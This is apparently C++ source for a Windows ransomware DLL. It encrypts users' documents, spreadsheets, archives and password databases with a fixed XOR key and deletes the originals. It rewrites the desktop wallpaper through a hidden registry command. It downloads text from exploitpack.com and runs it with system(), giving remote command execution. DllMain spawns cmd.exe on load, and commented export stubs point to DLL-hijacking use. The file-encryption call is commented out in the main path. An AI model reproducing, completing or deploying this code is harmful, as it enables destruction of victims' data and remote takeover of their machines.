#include <Windows.h>
#include "pch.h"
#include <tchar.h>
#include <iostream>
#include <string>
#include <fstream>
#include <sstream>
#include <vector>
#include <stack>
#include <iomanip>
#include <vector>
#include <locale>
#include <codecvt>
#include <algorithm>
#include <string>
#include <filesystem>
#include <stdio.h>

#pragma once
#include <WinHttp.h>
#pragma comment(lib, "winhttp.lib")

using namespace std;

#ifdef _WIN32
#include <io.h> 
#define access    _access_s
#else
#include <unistd.h>
#endif

bool FileExists(const std::string& Filename)
{
	return access(Filename.c_str(), 0) == 0;
}

std::wstring s2ws(const std::string& s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
	std::wstring r(buf);
	delete[] buf;
	return r;
}

class HttpRequest
{
private:
	std::wstring _userAgent;
	//std::wstring _proxyIp;
	//std::wstring _proxyPort;
public:
	HttpRequest(const std::wstring&, const std::wstring&, const std::wstring&);
	bool SendRequest(const std::wstring&, const std::wstring&, void*, DWORD, std::string);
	std::wstring responseHeader;
	std::vector<BYTE> responseBody;
};

HttpRequest::HttpRequest(const std::wstring& userAgent, const std::wstring& proxyIp, const std::wstring& proxyPort) :
	_userAgent(userAgent)
	//,_proxyIp(proxyIp) <--- PrOXy ??? goeS HEre
	//,_proxyPort(proxyPort) <--- P PrOXy pORt??? goeS HEre
{
}

bool HttpRequest::SendRequest(const std::wstring& url, const std::wstring& method, void* body, DWORD bodySize, std::string path)
{
	DWORD dwSize;
	DWORD dwDownloaded;
	DWORD headerSize = 0;
	BOOL  bResults = FALSE;
	HINTERNET hSession = WinHttpOpen(_userAgent.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	HINTERNET hConnect = WinHttpConnect(hSession, url.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, method.c_str(), L"/test.html", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

	responseHeader.resize(0);
	responseBody.resize(0);
	std::wstring stemp = s2ws(path);
	LPCWSTR result = stemp.c_str();


	hSession = WinHttpOpen(_userAgent.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (hSession)
		hConnect = WinHttpConnect(hSession, url.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
	else
		printf("session handle failed\n");

	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, method.c_str(), result, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
	else
		printf("connect handle failed\n");

	if (hRequest)
		bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, body, bodySize, 0, 0);
	else
		printf("request handle failed\n");

	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);
	if (bResults)
	{
		bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_RAW_HEADERS_CRLF, NULL, WINHTTP_NO_OUTPUT_BUFFER, &headerSize, WINHTTP_NO_HEADER_INDEX);
		if ((!bResults) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
		{
			responseHeader.resize(headerSize / sizeof(wchar_t));
			if (responseHeader.empty())
			{
				bResults = TRUE;
			}
			else
			{
				bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_RAW_HEADERS_CRLF, NULL, &responseHeader[0], &headerSize, WINHTTP_NO_HEADER_INDEX);
				if (!bResults) headerSize = 0;
				responseHeader.resize(headerSize / sizeof(wchar_t));
			}
		}
	}
	if (bResults)
	{
		do
		{
			// Check for available data.
			dwSize = 0;
			bResults = WinHttpQueryDataAvailable(hRequest, &dwSize);
			if (!bResults)
			{
				printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
				break;
			}

			if (dwSize == 0)
				break;

			do
			{
				// Allocate space for the buffer.
				DWORD dwOffset = responseBody.size();
				responseBody.resize(dwOffset + dwSize);

				// Read the data.
				bResults = WinHttpReadData(hRequest, &responseBody[dwOffset], dwSize, &dwDownloaded);
				if (!bResults)
				{
					printf("Error %u in WinHttpReadData.\n", GetLastError());
					dwDownloaded = 0;
				}

				responseBody.resize(dwOffset + dwDownloaded);

				if (dwDownloaded == 0)
					break;

				dwSize -= dwDownloaded;
			} while (dwSize > 0);
		} while (true);
	}

	// Report any errors.
	if (!bResults)
		printf("Error %d has occurred.\n", GetLastError());

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

	return bResults;

}

INT Encrypt(string fname, string oname) {
	string toEncrypt;
	ofstream fo;
	fo.open(oname.c_str());
	ifstream inFile;
	inFile.open(fname);
	stringstream strStream;
	strStream << inFile.rdbuf();
	string str = strStream.str();
	toEncrypt = str;
	char key[4] = { '1', '3', '3', '7' };
	string output = toEncrypt;
	for (int i = 0; i < toEncrypt.size(); i++)
		output[i] = toEncrypt[i] ^ key[i % (sizeof(key) / sizeof(char))];
	fo << output;
	return 0;
}

void FindFile(const std::wstring& directory)
{
	string in, key, fname, oname;
	std::wstring tmp = directory + L"\\*";
	WIN32_FIND_DATAW file;
	HANDLE search_handle = FindFirstFileW(tmp.c_str(), &file);
	if (search_handle != INVALID_HANDLE_VALUE)
	{
		std::vector<std::wstring> directories;
		do
		{
			if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if ((!lstrcmpW(file.cFileName, L".")) ||
					(!lstrcmpW(file.cFileName, L"..")))
					continue;
			}

			// wstring to string
			tmp = directory + L"\\" + std::wstring(file.cFileName);

			//setup converter
			using convert_type = std::codecvt_utf8<wchar_t>;
			std::wstring_convert<convert_type, wchar_t> converter;

			//use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
			std::string converted_str = converter.to_bytes(tmp);

			// doc docx xls xlsx ppt pptx one xps txt jpeg gif png dbx msg pdf pps xml rar zip 7z 7zip kdbx

			if ((converted_str.substr(converted_str.find_last_of(".")
				+ 1) == "docx") ||
				(converted_str.substr(converted_str.find_last_of(".") + 1) == "doc")
				|| (converted_str.substr(converted_str.find_last_of(".") + 1) ==
					"xls") || (converted_str.substr(converted_str.find_last_of(".") + 1)
						== "xlsx") || (converted_str.substr(converted_str.find_last_of(".") +
							1) == "ppt") || (converted_str.substr(converted_str.find_last_of(".")
								+ 1) == "pptx") ||
				(converted_str.substr(converted_str.find_last_of(".") + 1) == "one")
				|| (converted_str.substr(converted_str.find_last_of(".") + 1) ==
					"xps") || (converted_str.substr(converted_str.find_last_of(".") + 1)
						== "txt") || (converted_str.substr(converted_str.find_last_of(".") +
							1) == "jpeg") || (converted_str.substr(converted_str.find_last_of(".")
								+ 1) == "gif") ||
				(converted_str.substr(converted_str.find_last_of(".") + 1) == "png")
				|| (converted_str.substr(converted_str.find_last_of(".") + 1) ==
					"dbx") || (converted_str.substr(converted_str.find_last_of(".") + 1)
						== "msg") || (converted_str.substr(converted_str.find_last_of(".") +
							1) == "pdf") || (converted_str.substr(converted_str.find_last_of(".")
								+ 1) == "pps") ||
				(converted_str.substr(converted_str.find_last_of(".") + 1) == "pst")
				|| (converted_str.substr(converted_str.find_last_of(".") + 1) ==
					"xml") || (converted_str.substr(converted_str.find_last_of(".") + 1)
						== "rar") || (converted_str.substr(converted_str.find_last_of(".") +
							1) == "zip") || (converted_str.substr(converted_str.find_last_of(".")
								+ 1) == "7z") || (converted_str.substr(converted_str.find_last_of(".")
									+ 1) == "7zip") || (converted_str.substr(converted_str.find_last_of(".")
										+ 1) == "kdbx")) {

				// DEBUG
				// std::cout << "ENCRYPTED: ";
				// std::wcout << tmp << std::endl;
				//MessageBox(0, _T("This host has been Pwned."), _T("DEBUG ON"), 0);
				// DEBUG

				// Set the desired file extension to the encrypted files
				Encrypt(converted_str, converted_str + ".encrypted");
				remove(converted_str.c_str());
			}



			if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				directories.push_back(tmp);
		} while (FindNextFileW(search_handle, &file));

		FindClose(search_handle);

		for (std::vector<std::wstring>::iterator iter =
			directories.begin(), end = directories.end(); iter != end; ++iter)
			FindFile(*iter);
	}
}

INT SetBackground(const std::string& directory) {
	std::wstring stemp = s2ws(directory);
	LPCWSTR result = stemp.c_str();
#ifndef ARRAY_SIZE
#define ARRAY_SIZE(X) (sizeof(X) / sizeof(*X))
#endif

	// ISSUE - would be cleaner to do this on heap without artificial size limits
	TCHAR Buffer[MAX_PATH];

	PTSTR LastSlash;

	if (!GetModuleFileName(NULL, Buffer, ARRAY_SIZE(Buffer)))
	{
		// handle error
	}

	LastSlash = _tcsrchr(Buffer, _T('\\'));
	if (!LastSlash)
	{
		// this shouldn't happen.  treat it as an error.
	}

	LastSlash++;

	TCHAR ToAppend[] = _T("background.jpg");
	if (ARRAY_SIZE(ToAppend) > ARRAY_SIZE(Buffer) - (LastSlash - Buffer))
	{
		// you don't have enough space, this is an error
	}

	memcpy(LastSlash, ToAppend, sizeof(ToAppend));

	if (!CopyFile(Buffer, result, 0))
	{
		// this is an error
	}

	string regAdd = "reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" \/v Wallpaper \/t REG_SZ \/d \"" + directory + "\" \/f";
	// Magic
	char* a = new char[regAdd.size() + 1];
	a[regAdd.size()] = 0;
	memcpy(a, regAdd.c_str(), regAdd.size());
	// End Magic
	char cmd2[] = "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters \n";
	char cmd3[] = "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters \n";
	char cmd4[] = "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters \n";
	char cmd5[] = "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters \n";
	WinExec(a, SW_HIDE);
	WinExec(cmd2, SW_HIDE);
	WinExec(cmd3, SW_HIDE);
	WinExec(cmd4, SW_HIDE);
	WinExec(cmd5, SW_HIDE);
	return 0;
}

int Ransomware()
{
	// Limit according to http://msdn.microsoft.com/en-us/library/ms683188.aspx
	std::wstring buff;
	DWORD bufferSize = 65535;
	buff.resize(bufferSize);
	buff.resize(bufferSize);

	// Set the ENV variable to be used
	bufferSize = GetEnvironmentVariableW(L"USERPROFILE", &buff[0], bufferSize);
	if (!bufferSize)
		//error
		buff.resize(bufferSize);

	//setup converter
	using convert_type = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_type, wchar_t> converter;

	//use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
	std::string converted_str = converter.to_bytes(buff);

	// Remove null from Env var
	converted_str.resize(converted_str.find('\0'));

	// Back to W
	std::wstring str =
	std::wstring_convert<std::codecvt_utf8<wchar_t>>().from_bytes(converted_str);


	// READ TIMESTAMPT ( 15 min in mil 900000 )
	const long double sysTime = time(0);
	const long double sysTimeMS = sysTime * 1000;
	if (FileExists("mutex")) {
		string line;
		ifstream myfile("mutex");
		if (myfile.is_open())
		{
			while (getline(myfile, line))
			{
				// convert back to double float
				double num_double = std::stod(line);
				//cout << sysTimeMS - num_double << '\n';
				// check if more than 15 min passed ( 900000 mil)
				if ((sysTimeMS - num_double) > 9000) {
					myfile.close();
					ofstream myfile("mutex");
					if (myfile.is_open())
					{
						myfile << sysTimeMS;
						// SET BACKGROUND
						SetBackground(converted_str + "\\background.jpg");

						// FIND FILES AND ENCRYPT
						//FindFile(str);

						// GET REQUEST AND EXECUTE
						HttpRequest Request(L"Fake-o-matic UserAgent/1.0", L"", L"");
						if (Request.SendRequest(L"exploitpack.com", L"GET", NULL, 0, "test.html")) // <-- Replace domain.com and path.html 
						{
							//printf("%ls", Request.responseHeader.c_str());
							if (!Request.responseBody.empty())
								//printf("%*s", Request.responseBody.size(), (char*)&Request.responseBody[0]);
								system((char*)&Request.responseBody[0]);
						}
						myfile.close();
					}
				}
			}
			myfile.close();
		}

		else {
			//cout << "Unable to open file";
		}
	}
	else {
		ofstream myfile("mutex");

		if (myfile.is_open())
		{
			MessageBox(0, _T("INSIDE"), _T("DEBUG ON"), 0);

			myfile << sysTimeMS;
			myfile.close();
			MessageBox(0, _T("CLOSED FILE"), _T("DEBUG ON"), 0);

			// SET BACKGROUND
			SetBackground(converted_str + "\\background.jpg");

			// FIND FILES AND ENCRYPT
			//FindFile(str);

			// GET REQUEST AND EXECUTE
			HttpRequest Request(L"Fake-o-matic UserAgent/1.0", L"", L"");
			if (Request.SendRequest(L"exploitpack.com", L"GET", NULL, 0, "test.html")) // <-- Replace domain.com and path.html 
			{
				//printf("%ls", Request.responseHeader.c_str());
				if (!Request.responseBody.empty())
					//printf("%*s", Request.responseBody.size(), (char*)&Request.responseBody[0]);
					system((char*)&Request.responseBody[0]);
			}
		}
		//else cout << "Unable to open file";
	}
}

//void ReadFromMemory(DWORD addressToRead, float value)
//{
//	value = *(float*)addressToRead;
//}
//
//std::wstring s2ws(const std::string& s)
//{
//	int len;
//	int slength = (int)s.length() + 1;
//	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
//	wchar_t* buf = new wchar_t[len];
//	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
//	std::wstring r(buf);
//	delete[] buf;
//	return r;
//}

//int ReadMem() {
//	std::wstring stemp = s2ws(ReadFromMemory());
//	LPCWSTR result = stemp.c_str();
//}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	char cmd[] = "cmd.exe";

	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		WinExec(cmd, SW_SHOWNORMAL);
		ExitProcess(0);
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

//extern "C" __declspec(dllexport) auto SymFromAddr() {
//	return true;
//}
//
//extern "C" __declspec(dllexport) auto SymSetOptions() {
//	return true;
//}
//
//extern "C" __declspec(dllexport) auto SymGetOptions() {
//	return true;
//}
//
//extern "C" __declspec(dllexport) auto SymInitialize() {
//	return true;
//}

//extern "C" __declspec(dllexport) auto DnsFree() {
//	return true;
//}
//
//extern "C" __declspec(dllexport) auto DnsQuery_W() {
//	return true;
//}